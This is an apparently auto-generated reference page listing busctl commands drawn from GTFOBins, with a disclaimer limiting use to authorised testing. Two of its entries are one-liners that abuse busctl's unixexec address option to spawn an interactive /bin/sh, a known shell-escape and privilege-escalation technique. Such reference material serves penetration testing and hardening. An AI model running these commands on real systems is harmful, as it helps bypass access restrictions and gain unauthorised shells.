---
parsed_by: focuslocust
source: commands
type: generated
---
# busctl Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## busctl

Tool page: [busctl](../../tools/linux/busctl.md)

### inherit

```text
busctl --show-machine
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/busctl` |
| Evidence | Function example preserved from source parser. |

### shell

```text
busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/busctl` |
| Evidence | Function example preserved from source parser. |

### shell

```text
busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/busctl` |
| Evidence | Function example preserved from source parser. |
